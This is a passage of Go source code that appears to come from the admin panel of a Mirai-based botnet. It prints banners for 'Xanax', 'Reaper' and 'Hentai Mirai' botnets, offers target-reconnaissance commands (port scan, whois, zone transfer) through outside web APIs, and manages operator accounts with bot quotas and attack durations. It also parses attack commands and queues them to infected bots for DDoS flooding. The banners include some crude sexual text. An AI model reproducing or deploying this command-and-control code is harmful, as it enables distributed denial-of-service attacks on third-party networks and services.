            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m███\x1b[0;37m╗   \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m████\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;35m███\x1b[0;37m╔╝ \x1b[0;35m███████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m║\x1b[0;35m███████\x1b[0;37m║ ╚\x1b[0;35m███\x1b[0;37m╔╝ \r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╔╝ \x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║ ╚\x1b[0;35m████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m ██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\r   \x1b[0;35m*** \x1b[0;37mWelcome To Xanax | Version 8.0 \x1b[0;35m***\r\n"))
            this.conn.Write([]byte("\r       \x1b[0;35m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;35m***\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if err != nil || cmd == ":reaper" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;35m                ...                               \r\n"))
            this.conn.Write([]byte("\033[1;35m              ;::::;                              \r\n"))
            this.conn.Write([]byte("\033[1;35m            ;::::; :;                             \r\n"))
            this.conn.Write([]byte("\033[1;35m          ;:::::'   :;                            \r\n"))
            this.conn.Write([]byte("\033[1;35m         ;:::::;     ;.                           \r\n"))
            this.conn.Write([]byte("\033[1;35m        ,:::::'       ;           OOO             \r\n"))
            this.conn.Write([]byte("\033[1;35m        ::::::;       ;          OOOOO            \r\n"))
            this.conn.Write([]byte("\033[1;35m        ;:::::;       ;         OOOOOOOO          \r\n")) 
            this.conn.Write([]byte("\033[1;35m       ,;::::::;     ;'         / OOOOOOO         \r\n"))
            this.conn.Write([]byte("\033[1;35m     ;:::::::::`. ,,,;.        /  / DOOOOOO       \r\n")) 
            this.conn.Write([]byte("\033[1;35m   .';:::::::::::::::::;,     /  /     DOOOO      \r\n")) 
            this.conn.Write([]byte("\033[1;35m  ,::::::;::::::;;;;::::;,   /  /        DOOO     \r\n")) 
            this.conn.Write([]byte("\033[1;35m ;`::::::`'::::::;;;::::: ,#/  /          DOOO    \r\n")) 
            this.conn.Write([]byte("\033[1;35m :`:::::::`;::::::;;::: ;::#  /            DOOO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m ::`:::::::`;:::::::: ;::::# /              DOO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m `:`:::::::`;:::::: ;::::::#/               DOO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m  :::`:::::::`;; ;:::::::::##                OO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m  ::::`:::::::`;::::::::;:::#                OO   \r\n")) 
            this.conn.Write([]byte("\033[1;35m  `:::::`::::::::::::;'`:;::#                O    \r\n")) 
            this.conn.Write([]byte("\033[1;35m   `:::::`::::::::;' /  / `:#                     \r\n")) 
            this.conn.Write([]byte("\033[1;35m                                                  \r\n"))
            this.conn.Write([]byte("\033[1;35m           Welcome To The Reaper Botnet           \r\n"))
            this.conn.Write([]byte("\033[1;35m              Type ? To Get Started               \r\n"))
            this.conn.Write([]byte("\033[1;35m                                                  \r\n"))
            continue
        }
        if err != nil || cmd == ":hentai" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\x1b[0;96mSenpai\x1b[0;33m: \033[0m" + username + "\r\n"))
            this.conn.Write([]byte("\r\x1b[0;95mPassword\x1b[0;33m: **********\033[0m\r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))
            this.conn.Write([]byte("\r\x1b[0;37m                        [\x1b[0;31m+\x1b[0;95m] \x1b[0;96mFuck Me Senpai <3 \x1b[0;95m[\x1b[0;31m+\x1b[0;95m]       \r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))
            this.conn.Write([]byte("\r\x1b[0;95m         \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m                 ██\x1b[0;96m╗  \x1b[0;95m██\x1b[0;96m╗\x1b[0;95m███████\x1b[0;96m╗\x1b[0;95m███\x1b[0;96m╗   \x1b[0;95m██\x1b[0;96m╗\x1b[0;95m████████\x1b[0;96m╗ \x1b[0;95m█████\x1b[0;96m╗ \x1b[0;95m██\x1b[0;96m╗   \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m                 ██\x1b[0;96m║  \x1b[0;95m██\x1b[0;96m║\x1b[0;95m██\x1b[0;96m╔════╝\x1b[0;95m████\x1b[0;96m╗  \x1b[0;95m██\x1b[0;96m║╚══\x1b[0;95m██\x1b[0;96m╔══╝\x1b[0;95m██\x1b[0;96m╔══\x1b[0;95m██\x1b[0;96m╗\x1b[0;95m██\x1b[0;96m║   \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m                 ███████\x1b[0;96m║\x1b[0;95m█████\x1b[0;96m╗  \x1b[0;95m██\x1b[0;96m╔\x1b[0;95m██\x1b[0;96m╗ \x1b[0;95m██\x1b[0;96m║   \x1b[0;95m██\x1b[0;96m║   \x1b[0;95m███████\x1b[0;96m║\x1b[0;95m██\x1b[0;96m║   \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m                 ██\x1b[0;96m╔══\x1b[0;95m██\x1b[0;96m║\x1b[0;95m██\x1b[0;96m╔══╝  \x1b[0;95m██\x1b[0;96m║╚\x1b[0;95m██\x1b[0;96m╗\x1b[0;95m██\x1b[0;96m║   \x1b[0;95m██\x1b[0;96m║   \x1b[0;95m██\x1b[0;96m╔══\x1b[0;95m██\x1b[0;96m║\x1b[0;95m██\x1b[0;96m║   \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m                 ██\x1b[0;96m║  \x1b[0;95m██\x1b[0;96m║\x1b[0;95m███████\x1b[0;96m╗\x1b[0;95m██\x1b[0;96m║ ╚\x1b[0;95m████\x1b[0;96m║   \x1b[0;95m██\x1b[0;96m║   \x1b[0;95m██\x1b[0;96m║  \x1b[0;95m██\x1b[0;96m║\x1b[0;95m██\x1b[0;96m║   \r\n"))
            this.conn.Write([]byte("\r\x1b[0;96m                 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝                                                                                                                                                                                                    \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m               [\x1b[0;31m+\x1b[0;96m] Hentai Mirai Botnet - Created By Kasaya <3 [\x1b[0;31m+\x1b[0;95m]        \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m         \r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))
            continue

		}
            if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[0m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/WHOIS" || cmd == "/whois" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/PING" || cmd == "/ping" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[0m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[31mWebsite (Without www.)\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[0m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/reversedns" || cmd == "/REVERSEDNS" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/asnlookup" || cmd == "/asnlookup" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[31mIP Address Or Website (Without www.)\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[0mUsername:\033[31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[31m(\033[0m-1 for access to all\033[31m)\033[0m:\033[31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[31m(\033[0m-1 for none\033[31m)\033[0m:\033[31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[31m(\033[0m0 for none\033[31m)\033[0m:\033[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[31m" + new_un + "\r\n\033[0m- Password - \033[31m" + new_pw + "\r\n\033[0m- Bots - \033[31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[31m" + duration_str + "\r\n\033[0m- Cooldown - \033[31m" + cooldown_str + "   \r\n\033[0mContinue? \033[31m(\033[01;32my\033[31m/\033[01;31mn\033[31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[31mUsername: \033[31m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[31m" + rm_un + "?\033[31m(\033[01;32my\033[31m/\033[01;31mn\033[31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[0mUsername:\033[31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[31m(\033[0m-1 for access to all\033[31m)\033[0m:\033[31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[31m(\033[0m-1 for none\033[31m)\033[0m:\033[31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[31m(\033[0m0 for none\033[31m)\033[0m:\033[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[31m" + new_un + "\r\n\033[0m- Password - \033[31m" + new_pw + "\r\n\033[0m- Bots - \033[31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[31m" + duration_str + "\r\n\033[0m- Cooldown - \033[31m" + cooldown_str + "   \r\n\033[0mContinue? \033[31m(\033[01;32my\033[31m/\033[01;31mn\033[31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m%s [\x1b[0;31m%d\x1b[0;37m]\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37mTotal \x1b[0;37m[\x1b[0;31m%d\x1b[0;37m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
